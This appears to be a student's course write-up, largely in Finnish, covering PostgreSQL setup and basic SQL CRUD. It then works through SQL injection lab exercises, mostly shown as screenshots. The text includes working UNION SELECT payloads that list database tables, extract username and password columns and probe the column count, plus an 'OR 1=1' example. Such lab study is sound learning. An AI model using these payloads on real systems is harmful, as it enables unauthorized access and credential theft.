# h5

PostgreSQL Install and One Table Database – SQL CRUD tutorial for Ubuntu

Three line install
$ sudo apt-get update
$ sudo apt-get -y install postgresql
$ sudo systemctl start postgresql # needed in 2023
$ sudo -u postgres createdb $(whoami)
$ sudo -u postgres createuser $(whoami)
The trick is to use your Linux system username for PostgreSQL database and PostgreSQL user. Then authentication is automatic.

$ psql

table

tero=> CREATE TABLE students (id SERIAL PRIMARY KEY, name VARCHAR(200));
CREATE TABLE

insert

tero=> INSERT INTO students(name) VALUES ('Tero');
INSERT 0 1

select

tero=> SELECT * FROM students;

update

tero=> UPDATE students SET name='Tero Karvinen' WHERE name='Tero';

UPDATE 1

delete

tero=> DELETE FROM students WHERE name='Liisa';
DELETE 1
tero=> SELECT * FROM students;

SQL injection

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve.

A successful SQL injection attack can result in unauthorized access to sensitive data, such as:

Passwords.
Credit card details.
Personal user information.

You can detect SQL injection manually using a systematic set of tests against every entry point in the application. 

a.)
ensiksi asensin ja käynnistin postgreSQL tietokannan

![alku](https://github.com/AkiAleksi/h5/assets/112399816/194cd8be-a30c-43e2-a335-f66ab08e8ec7)


Sen jälkeen loin tietokannan ja käyttäjän.


$ sudo -u postgres createdb kali


$ sudo -u postgres createuser kali


Tein käyttäjästä kali databasen ownerin komennolla:



sudo -u postgres psql -c "ALTER DATABASE kali OWNER TO kali;"



![alku3](https://github.com/AkiAleksi/h5/assets/112399816/59879e3a-48f4-4867-9e67-2102bd76bae2)


Loin uuden taulun:

CREATE TABLE students (id SERIAL PRIMARY KEY, name VARCHAR(200));

![1jee](https://github.com/AkiAleksi/h5/assets/112399816/d33a7880-6ad9-4c9e-b5be-d437df410e65)


CRUD
Loin uuden nimen tauluun.

INSERT INTO students(name) VALUES ('Aki');

Sen jälkeen tein Read kohdan komennolla:

SELECT * FROM students;

![2jee](https://github.com/AkiAleksi/h5/assets/112399816/0d4d2d24-e0f2-4c7d-b2b1-3793d2d516b6)


Päivitin nimen Aki. Nimeen Aki Hietamäki:

UPDATE students SET name='Aki Hietamäki' WHERE name='Aki'; 

![3jee](https://github.com/AkiAleksi/h5/assets/112399816/c6b810fb-84b6-487a-a866-d2884351726e)




Sen jälkeen poistin:

DELETE FROM students WHERE name='Aki';


![4jee](https://github.com/AkiAleksi/h5/assets/112399816/0d65a9ca-9814-4d9f-be7b-bd7765676269)


b.)

SELECT * FROM Users WHERE id = 10 OR 1=1;


The SQL above is valid and will return ALL rows from the "Users" table, since OR 1=1 is always TRUE.

id avain on valmiina ohjelmassa. Käyttäjän syöte on id:n arvo ja johon on jatkettu OR lause.


![xdddd](https://github.com/AkiAleksi/h5/assets/112399816/e7b429b9-d019-493d-a320-c45d753e8f7e)

c.)


![Screenshot 2023-11-24 at 14 12 37](https://github.com/AkiAleksi/h5/assets/112399816/f305305f-dbc7-41e8-b524-3ba3e7f4d075)



![Screenshot 2023-11-24 at 14 13 13](https://github.com/AkiAleksi/h5/assets/112399816/c700b799-ade3-4bb8-a589-90c5960d7900)



d.)



![Screenshot 2023-11-24 at 14 22 13](https://github.com/AkiAleksi/h5/assets/112399816/6501edc1-4712-43ec-8f7b-467a8b1a8e89)



![Screenshot 2023-11-24 at 14 23 20](https://github.com/AkiAleksi/h5/assets/112399816/810df58f-6ba5-4ae5-82f7-c5a7e251c392)


e.)




![Screenshot 2023-11-24 at 15 17 33](https://github.com/AkiAleksi/h5/assets/112399816/b5504c02-1e81-435c-8e0a-71fd18f03f08)




f.)


![Screenshot 2023-11-24 at 16 37 05](https://github.com/AkiAleksi/h5/assets/112399816/34d1186f-c68b-4e5b-bddb-0fd5ed2d287a)





![Screenshot 2023-11-24 at 16 37 50](https://github.com/AkiAleksi/h5/assets/112399816/ffd305ee-84c6-4854-8f9b-ac9d991ad8f1)







![Screenshot 2023-11-24 at 16 38 20](https://github.com/AkiAleksi/h5/assets/112399816/87f1af3d-33dc-4e81-aac8-655b4e6d5826)



g.)


Etsin kaikki taulut tietokannasta

'union+select+table_name,'123'+from+all_tables--

![user1](https://github.com/AkiAleksi/h5/assets/112399816/088dba52-1367-410c-a349-a9108927e78d)



![user2](https://github.com/AkiAleksi/h5/assets/112399816/1993c581-7e6a-4209-a78e-a30807da7946)


Löytyi PASSWORD_ ja USERNAME_ sarakkeet

![Screenshot 2023-11-25 at 12 53 09](https://github.com/AkiAleksi/h5/assets/112399816/75ec55ae-f133-4273-a09f-b0a3406db76e)

'+union+select+PASSWORD_RNBGTX,USERNAME_ECTSRI+from+USERS_VYMYAO--


![info](https://github.com/AkiAleksi/h5/assets/112399816/2e9d88f1-7fb7-44bc-8d93-30671a33410d)


Kirjauduin tiedoilla MY account


![okkkk](https://github.com/AkiAleksi/h5/assets/112399816/344ac34f-7b55-4826-bfc8-baf0cd398285)


h.)

Katsoin läpikävelyn kyseisestä tehtävästä.

'UNION+SELECT+NULL,NULL--


internal server error

Lisäsin NULL niin kauan, että ei tullut erroria.

'UNION+SELECT+NULL,NULL,NULL,NULL--


![Screenshot 2023-11-25 at 13 38 10](https://github.com/AkiAleksi/h5/assets/112399816/fcbcb7f7-1bb3-4f1f-a7af-4aa00c957c6a)






![Screenshot 2023-11-25 at 13 34 49](https://github.com/AkiAleksi/h5/assets/112399816/5f0a0222-1079-415b-9746-a702579cc0c6)

i.)


![ggg](https://github.com/AkiAleksi/h5/assets/112399816/3b1b10d9-04ca-43c7-b75b-b905b4961710)




![Screenshot 2023-11-25 at 14 02 58](https://github.com/AkiAleksi/h5/assets/112399816/1d823a47-037a-41ec-ba18-5000374d0c37)



![Screenshot 2023-11-25 at 14 07 55](https://github.com/AkiAleksi/h5/assets/112399816/2035889e-45f1-4cec-93b7-696b26b7357f)

j.)




![admin1](https://github.com/AkiAleksi/h5/assets/112399816/87743028-bcfd-493f-92f9-4e1e5e23769b)





![kkkkkkkkkk](https://github.com/AkiAleksi/h5/assets/112399816/ce1024f6-f6f4-4688-a31e-710b8393cee5)






![ratkaisu](https://github.com/AkiAleksi/h5/assets/112399816/2bc8f513-880a-47d8-a856-45cdc6689196)

